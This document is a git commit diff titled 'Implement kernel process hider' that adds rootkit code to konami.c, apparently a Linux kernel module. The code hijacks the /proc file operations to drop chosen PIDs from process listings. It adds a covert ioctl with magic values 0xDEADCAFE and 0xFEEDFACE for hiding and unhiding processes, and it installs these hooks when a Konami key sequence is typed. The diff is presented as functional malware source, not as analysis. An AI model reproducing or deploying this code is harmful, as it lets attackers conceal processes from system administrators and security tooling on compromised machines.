31d511c6b992d6739f169d2388fa36f8bcbba9fa
Chase Colman <chase@colman.io>
2018-10-30 00:18:16 -0400

    Implement kernel process hider

--- konami.c
+++ konami.c
@@ -22,6 +22,9 @@
 #include <linux/kallsyms.h> // kallsysms_lookup_name
 #include <linux/linkage.h>
 
+// Proc hide headers
+#include <linux/namei.h> // kern_path
+
 // Key combo headers
 #include <linux/interrupt.h> // IRQ for keyboard intercept
 #include <linux/workqueue.h>
@@ -152,6 +155,180 @@ restore_exec(void)
 	}
 }
 
+/* Process Hiding and Control */
+
+// List of Ghost PIDs to hide
+static unsigned long ghost_pids[4] = {0};
+// Number of hidden Ghosts
+static int ghost_count = 0;
+
+// Original /proc fops
+static const struct file_operations *original_proc_fop;
+// Original /proc ctx
+static struct dir_context *original_proc_ctx;
+// Mutated /proc fops
+static struct file_operations proc_fop;
+
+// Wrapped /proc filldir that ignores Ghost PIDs
+static int
+proc_filldir(struct dir_context *ctx, const char *name, int namlen,
+		loff_t offset, u64 ino, unsigned int d_type)
+{
+	int error, i;
+	unsigned long pid;
+	if ((error = kstrtoul(name, 10, &pid)))
+	{
+		pr_debug("pr_fd - failed to convert to int\n");
+		return error;
+	}
+
+	for (i = 0; i < 4; i++)
+	{
+		if (ghost_pids[i] == pid)
+		{
+			return 0; // Finish before entry is returned
+		}
+	}
+
+	// Call original filldir
+	return original_proc_ctx->actor(ctx, name, namlen, offset, ino, d_type);
+}
+
+// Wrapped /proc iterate_shared that calls wrapped proc_fill_dir
+static int
+proc_iterate_shared(struct file *file, struct dir_context *ctx)
+{
+	int error;
+	struct dir_context proc_ctx = {
+		.actor = proc_filldir,
+		.pos = ctx->pos
+	};
+
+	original_proc_ctx = ctx; // Store pointer to original for wrapper
+
+	error = original_proc_fop->iterate_shared(file, &proc_ctx);
+	ctx->pos = proc_ctx.pos; // Update next position from result
+
+	return error;
+}
+
+// Adds pid to ghost_pids
+void
+hide_pid(unsigned long pid)
+{
+	int i;
+	if (ghost_count >= 4)
+	{
+		return;
+	}
+	
+	for (i = 0; i < 4; i++)
+	{
+		if (ghost_pids[i] == pid)
+		{
+			pr_debug("pr_io - ghost %lu already exists", pid);
+			return;
+		}
+	}
+
+	ghost_pids[ghost_count++] = pid;
+	pr_debug("pr_io - adding %lu, count: %d\n", pid, ghost_count);
+}
+
+void restore(void); // Only function that violates order
+
+// Removes pid from ghost_pids
+void
+unhide_pid(unsigned long pid)
+{
+	int i;
+	for (i = 0; i < 4; i++)
+	{
+		if (ghost_pids[i] == pid)
+		{
+			ghost_pids[i] = 0;
+			ghost_count--;
+			pr_debug("pr_io - removing %lu, count: %d\n", pid, ghost_count);
+		}
+	}
+
+	if (ghost_count != 0)
+	{
+		return;
+	}
+
+	// No ghosts remaining, restore to normal
+	restore();
+}
+
+// ioctl on /proc, receives signals from manpac
+static long
+proc_ioctl(struct file* file, unsigned int command, unsigned long pid)
+{
+	switch (command)
+	{
+		case 0xDEADCAFE: // Received ghost_pid add
+			hide_pid(pid);
+			break;
+		case 0xFEEDFACE: // Received ghost_pid remove
+			unhide_pid(pid);
+			break;
+
+		default:
+			return -EINVAL;
+	}
+	return 0;
+}
+
+// Installs wrapped iterate_shared and ioctl fops on /proc
+void
+install_proc_fop(void)
+{
+	struct path path;
+	if (kern_path("/proc", 0, &path) != 0)
+	{
+		pr_debug("pr_fop i - failed to retrieve /proc");
+		return;
+	}
+
+	original_proc_fop = path.dentry->d_inode->i_fop; // Pointer to original /proc fop
+	proc_fop = *original_proc_fop; // Clone original /proc fop
+	proc_fop.iterate_shared = proc_iterate_shared; // Wrap /proc iterate_shared
+	proc_fop.unlocked_ioctl = proc_ioctl; // Add ioctl to /proc
+
+	path.dentry->d_inode->i_fop = &proc_fop; // Install fop
+}
+
+// Restores fops on /proc
+void
+restore_proc_fop(void)
+{
+	struct path path;
+	if (kern_path("/proc", 0, &path) != 0)
+	{
+		pr_debug("pr_fop r - failed to retrieve /proc");
+		return;
+	}
+
+	path.dentry->d_inode->i_fop = original_proc_fop; // Restore fop
+}
+
+/* Install/Restore */
+
+void
+install(void)
+{
+	install_proc_fop();
+	install_exec_wrapper();
+}
+
+void
+restore(void)
+{
+	restore_exec();
+	restore_proc_fop();
+}
+
 /* Keyboard Combo Launcher */
 
 // Work queue worker that handles key combo detection.
@@ -201,9 +378,13 @@ kb_combo_handler(struct work_struct *work)
 			kb_pos = 0; // Reset on invalid key
 	}
 
+	kfree(kb); // Free alloc
+
 	if (kb_pos == 11)
 	{
 		pr_debug("Konami Code Entered!\n");
+		install();
+		pr_debug("Installed hooks.\n");
 	}
 }
 
